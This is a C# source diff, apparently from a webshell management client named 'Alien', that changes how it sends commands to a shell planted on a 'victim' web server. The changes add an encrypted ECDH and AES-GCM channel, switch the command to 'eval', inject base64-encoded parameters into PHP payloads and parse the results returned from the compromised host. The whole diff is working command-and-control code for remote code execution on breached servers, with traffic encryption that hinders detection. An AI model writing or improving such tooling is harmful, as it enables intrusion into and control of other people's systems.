@@ -21,7 +21,7 @@ namespace Alien
 
         private bool m_bUseCrypto { get; init; }
         private AesGcm m_aesgcm { get; set; }
-        private byte[] m_abSessionToken { get; set; }
+        private string m_szSessionToken { get; set; }
         private bool bTokenExisted { get; set; }
         private int m_nSequence { get; set; }
 
@@ -225,46 +225,46 @@ namespace Alien
                             throw new Exception("Server identity verification failed");
 
                         // client ECDH
-                        using ECDiffieHellman clntEcdh = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256);
-                        byte[] abClntEcdhPub = clntEcdh.ExportSubjectPublicKeyInfo();
-                        string szEcdhPubPem = fnszPemEncode("PUBLIC KEY", abClntEcdhPub).Replace("\r\n", "\n").Trim();
-
-                        // client signing key
-                        using ECDsa dsa = ECDsa.Create(ECCurve.NamedCurves.nistP256);
-                        byte[] abClntSignPub = dsa.ExportSubjectPublicKeyInfo();
-                        string szClntSignPubPem = fnszPemEncode("PUBLIC KEY", abClntSignPub).Replace("\r\n", "\n").Trim();
-
-                        byte[] abClntSign = dsa.SignData(
-                            Encoding.UTF8.GetBytes(szEcdhPubPem),
-                            HashAlgorithmName.SHA256,
-                            DSASignatureFormat.Rfc3279DerSequence
-                        );
-
-                        var handshakeResp = await fnPostJson(m_victim.ShellURL, new
+                        using (ECDiffieHellman clntEcdh = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256))
                         {
-                            handshakeToken = szHandshakeToken,
-                            clientEcdhPub = szEcdhPubPem,
-                            clientSignPub = szClntSignPubPem,
-                            clientSig = Convert.ToBase64String(abClntSign)
-                        });
+                            byte[] abClntEcdhPub = clntEcdh.ExportSubjectPublicKeyInfo();
+                            string szEcdhPubPem = fnszPemEncode("PUBLIC KEY", abClntEcdhPub).Replace("\r\n", "\n").Trim();
 
-                        if (handshakeResp.TryGetProperty("error", out var err))
-                            throw new Exception($"Handshake failed: {err.GetString()}");
+                            // client signing key
+                            using ECDsa dsa = ECDsa.Create(ECCurve.NamedCurves.nistP256);
+                            byte[] abClntSignPub = dsa.ExportSubjectPublicKeyInfo();
+                            string szClntSignPubPem = fnszPemEncode("PUBLIC KEY", abClntSignPub).Replace("\r\n", "\n").Trim();
 
-                        m_abSessionToken = Convert.FromBase64String(
-                            handshakeResp.GetProperty("sessionToken").GetString()
-                        );
+                            byte[] abClntSign = dsa.SignData(
+                                Encoding.UTF8.GetBytes(szEcdhPubPem),
+                                HashAlgorithmName.SHA256,
+                                DSASignatureFormat.Rfc3279DerSequence
+                            );
 
-                        // derive shared secret
-                        using ECDiffieHellman servEcdh = ECDiffieHellman.Create();
-                        servEcdh.ImportFromPem(szServerEcdhPem);
+                            var handshakeResp = await fnPostJson(m_victim.ShellURL, new
+                            {
+                                handshakeToken = szHandshakeToken,
+                                clientEcdhPub = szEcdhPubPem,
+                                clientSignPub = szClntSignPubPem,
+                                clientSig = Convert.ToBase64String(abClntSign)
+                            });
 
-                        byte[] abSharedSecret = clntEcdh.DeriveRawSecretAgreement(servEcdh.PublicKey);
-                        byte[] abAesKey = fnabHKDFExpand(abSharedSecret, 32, "secure-channel");
+                            if (handshakeResp.TryGetProperty("error", out var err))
+                                throw new Exception($"Handshake failed: {err.GetString()}");
 
-                        m_aesgcm = new AesGcm(abAesKey, 16);
+                            m_szSessionToken = handshakeResp.GetProperty("sessionToken").GetString();
 
-                        bTokenExisted = true;
+                            // derive shared secret
+                            using ECDiffieHellman servEcdh = ECDiffieHellman.Create();
+                            servEcdh.ImportFromPem(szServerEcdhPem);
+
+                            byte[] abSharedSecret = clntEcdh.DeriveRawSecretAgreement(servEcdh.PublicKey);
+                            byte[] abAesKey = fnabHKDFExpand(abSharedSecret, 32, "secure-channel");
+
+                            m_aesgcm = new AesGcm(abAesKey, 16);
+
+                            bTokenExisted = true;
+                        }
                     }
 
                     if (m_aesgcm == null)
@@ -272,10 +272,12 @@ namespace Alien
 
                     var obj = new
                     {
-                        cmd = "request",
+                        cmd = "eval",
                         seq = m_nSequence,
                         data = szPayloadData
                     };
+
+                    //MessageBox.Show(szPayloadData);
 
                     byte[] plaintext = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(obj, s_jsonOpts));
 
@@ -295,7 +297,7 @@ namespace Alien
 
                     var encryptedBody = JsonSerializer.Serialize(new
                     {
-                        sessionToken = Convert.ToBase64String(m_abSessionToken),
+                        sessionToken = m_szSessionToken,
                         payload = encryptedPayload
                     }, s_jsonOpts);
 
@@ -314,7 +316,7 @@ namespace Alien
                     );
                 }
 
-                resp = await m_clnt.PostAsync(string.Empty, content);
+                resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
                 szRespContent = await resp.Content.ReadAsStringAsync();
 
                 if (!m_bUseCrypto)
@@ -340,14 +342,16 @@ namespace Alien
                         var respJson = JsonDocument.Parse(szRespContent).RootElement;
 
                         // Update session token for next request
-                        m_abSessionToken = Convert.FromBase64String(
-                            respJson.GetProperty("sessionToken").GetString()
-                        );
+                        m_szSessionToken = respJson.GetProperty("sessionToken").GetString();
 
                         // Then decrypt the payload
-                        byte[] enc = Convert.FromBase64String(
-                            respJson.GetProperty("payload").GetString()
-                        );
+                        string? szResp = respJson.GetProperty("payload").GetString();
+                        if (string.IsNullOrEmpty(szResp))
+                            throw new Exception("HTTP response is empty.");
+
+                        //MessageBox.Show(szResp);
+
+                        byte[] enc = Convert.FromBase64String(szResp);
 
                         byte[] respNonce = enc[..12];
                         byte[] respTag = enc[12..28];
@@ -357,8 +361,22 @@ namespace Alien
                         m_aesgcm.Decrypt(respNonce, respCt, respTag, decrypted);
 
                         string result = Encoding.UTF8.GetString(decrypted);
+                        JsonDocument json = JsonDocument.Parse(result);
+                        JsonElement root = json.RootElement;
+
+                        string? val = root.GetProperty("eval").GetString();
+                        if (string.IsNullOrEmpty(val))
+                            throw new Exception("Value is null or empty.");
+
+                        val = clsEzData.fnszB64d2str(val).Replace("\r\n", string.Empty).Trim('\r').Trim('\n');
+                        szSplitter = $"[{szSplitter}]";
+                        val = val.Split(szSplitter)[1];
+
                         m_nSequence++;
-                        return result;
+
+                        //MessageBox.Show(val);
+
+                        return val;
                     }
                     catch (Exception ex)
                     {
@@ -487,11 +505,27 @@ namespace Alien
             string szSplitter = clsEzData.fnszGenerateRandomStr();
             string szPayload = fnGetPayload(szPayloadName, szSplitter);
 
-            for (int i = 0; i < asParams.Length; i++)
-                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
+            if (m_bUseCrypto)
+            {
+                for (int i = 0; i < asParams.Length; i++)
+                {
+                    //szPayload = szPayload.Replace($"z{i}", clsEzData.fnszStre2b64(asParams[i]));
+                    switch (m_victim.ShellLanguage)
+                    {
+                        case enLanguage.PHP:
+                            szPayload = szPayload.Replace($"$_POST['z{i}']", $"\"{clsEzData.fnszStre2b64(asParams[i])}\"");
+                            break;
+                    }
+                }
+            }
+            else
+            {
+                for (int i = 0; i < asParams.Length; i++)
+                    asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
 
-            string szParams = string.Join("&", asParams);
-            szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";
+                string szParams = string.Join("&", asParams);
+                szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";
+            }
 
             return await fnHttpPOST(szPayload, szSplitter);
         }
@@ -535,6 +569,9 @@ namespace Alien
                 string szPayload = File.ReadAllText(szPayloadFilePath);
                 foreach (string szPattern in m_dicRemoveSyntax[m_victim.ShellLanguage])
                     szPayload = szPayload.Replace(szPattern, string.Empty);
+
+                const string split = "----------[THE CODE ABOVE WILL NOT BE INCLUDED]----------";
+                szPayload = szPayload.Split(new string[] { split }, StringSplitOptions.None).Last();
 
                 string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
                 szPayload = $"{szSplitFunc}{szPayload}{szSplitFunc}";
